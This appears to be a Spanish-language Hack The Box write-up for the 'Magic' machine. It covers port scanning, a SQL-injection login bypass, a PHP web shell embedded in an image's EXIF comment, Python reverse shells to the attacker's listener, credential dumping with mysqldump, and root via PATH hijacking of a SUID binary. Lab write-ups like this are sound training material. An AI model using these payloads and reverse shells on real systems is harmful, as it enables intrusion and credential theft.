---
layout: single
title: Magic- Hack The Box
excerpt: "Magic es una máquina Linux de dificultad media en la cual se va a aprovechar la vulnerabilidad en inyección de código SQL y luego subir una imagen en la cual vamos a incrustar un payload para obtener la shell inicial. En la fase de escalamiento de privilegios, vamos a manipular el PATH de un programa SUID."
date: 2020-08-22
classes: wide
header:
  teaser: /assets/images/hack-the-box/magic_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - Inyección SQL
  - PATH hijacking
---

<p align="center">
<img src="/assets/images/hack-the-box/magic_logo.png">
</p>


Magic es una máquina Linux de dificultad media en la cual se va a aprovechar la vulnerabilidad en inyección de código SQL y luego subir una imagen en la cual vamos a incrustar un payload para obtener la shell inicial. En la fase de escalamiento de privilegios, vamos a manipular vamos a manipular el PATH de un programa SUID.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 magic.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n magic.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Magic]           
└──╼ $nmap -p- --open -T5 -v -n magic.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:53 EDT

PORT      STATE SERVICE                    
22/tcp    open  ssh                       
80/tcp    open  http
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80 magic.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Magic]           
└──╼ $nmap -sC -sV -p22,80 magic.htb -oN targeted.txt   
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:56 EDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

### Enumeración HTTP

Revisando el sitio web, encontramos un link de `login` que nos redirecciona a la página `login.php` donde está en campo de usuario y contraseña. Lo primero que hacemos es revisar si es vulnerable a inyección de código SQL y efectivamente nos sirve. El comando utilizado es el siguiente

```sql
Username: 'or''='
Password: 'or''='
```




## Explotación

Una vez que introducimos los comandos anteriores nos redirecciona a la página `upload.php` y nos permite subir una imagen. Lo primero que intentamos es subir un archivo `.php` pero no funciona. Buscando en internet cómo hacer bypass para subir archivos en páginas web y encontramos que usando la herramienta `exiftool` podemos  manipular imágenes así que vamos a esconder un payload en la imagen de la siguiente manera

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Magic]
└──╼ #exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' imagen.jpeg 
    1 image files updated                                                                                                              
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Magic]
└──╼ #mv imagen.jpeg imagen.php.jpeg
```

Luego cargamos la imagen en el sistema. Para tener la shell reversa, escribimos lo siguiente en la url y antes de darle enter, debemos ponernos en modo escucha con netcat en el puerto que hayamos establecido

```
http://10.10.10.185/images/uploads/hack.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
┌──[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Magic]
└──╼ #nc -nlvp 9001                                                                                                                    
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.185] 58698
/bin/sh: 0: can't access tty; job control turned off                                                                                   
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$ ls
7.jpg      logo.png            magic-hat_23-2147512156.jpg  prueba.php.jpg
```

Buscando archivo sensibles que nos de información para las credenciales del usuario, encontramos el archivo `db.php5` y encontramos lo siguiente

```php
www-data@ubuntu:/var/www/Magic/images/uploads$ cd /var/www/Magic
www-data@ubuntu:/var/www/Magic$ ls
assets  db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5

<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
}
```

Tratamos de cambiarnos al usuario `theseus` con las credenciales encontramos pero la contraseña es incorrecta.

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: iamkingtheseus

su: Authentication failure
```

Usando la herramienta `sqldump` podemos hacer el volcado de la base de datos con el nombre de usuario y contraseña de la siguiente forma

```bash
www-data@ubuntu: mysqldump --databases Magic -utheseus -piamkingtheseus

-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
-- Host: localhost    Database:
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1
-- Current Database: `Magic`
-- Dumping data for table `login`

LOCK TABLES `login` WRITE;

INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');

UNLOCK TABLES;
```

Como podemos observar ya encontramos la contraseña del admin y procedemos a logearnos con esta credenciales

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ su theseus
theseus@ubuntu:/var/www/Magic$cat /home/theseus/user.txt
88694a..........................
```




## Escalamiento de privilegios

Ahora, buscamos los archivos SUID que son los archivos en los cuales el usuario puedo ejecutar comandos con los permisos de root y cambiar los comportamientos en los directorios.

```console
theseus@ubuntu:~/.ssh$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

Hay un SUID muy particular que es `sysinfo` y que se divide en 4 partes. Estas 4 partes usan los siguientes comandos de Linux

```
- Hardware Info = lshw -short
- Disk Info = fdisk -l
- CPU Info = cat /proc/cpuinfo
- Mem Usage = free -h
```

Procedemos a cambiar las variables del PATH y en este caso vamos a utilizar `lshw`. Para esto, creamos una shell reversa en Python y lo guardamos en un archivo llamado `lshw`

```python
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Magic]
└──╼ #pluma lshw

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Con `wget` enviamos este archivo a la máquina de Magic a la carpeta `/tmp`

```bash
www-data@ubuntu:/tmp$ wget http://10.10.14.21:80/lshw
wget http://10.10.14.21:80/lshw                                    
--2020-06-04 22:53:48--  http://10.10.14.21/lshw                                                                                       
Connecting to 10.10.14.21:80... connected.                         
HTTP request sent, awaiting response... 200 OK                     
Length: 226 [application/octet-stream]                             
Saving to: 'lshw'                

lshw                100%[===================>]     226  --.-KB/s    in 0.009s  

2020-06-04 22:53:48 (25.1 KB/s) - 'lshw' saved [226/226]
```

Cambiamos los permisos a este archivo y cambiamos el `PATH` en las variables de entorno

```bash
www-data@ubuntu:/tmp$ chmod +x lshw                                
chmod +x lshw                    
www-data@ubuntu:/tmp$ export PATH=/tmp:$PATH                       
export PATH=/tmp:$PATH           
```

Finalmente, creamos una sesión en netcat en modo escucha en el puerto que hayamos establecido en el archivo `lshw` y ejecutamos el comando `sysinfo`. De esta forma, ya obtendremos el flag del root.

```bash
theseus@ubuntu:/tmp/magic$ sysinfo
sysinfo

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Magic]
└──╼ #nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.185] 57314
root@ubuntu:/tmp/magic# whoami
whoami
root
root@ubuntu:/tmp/magic# cat /root/root.txt
cat /root/root.txt
8aacad..........................
```

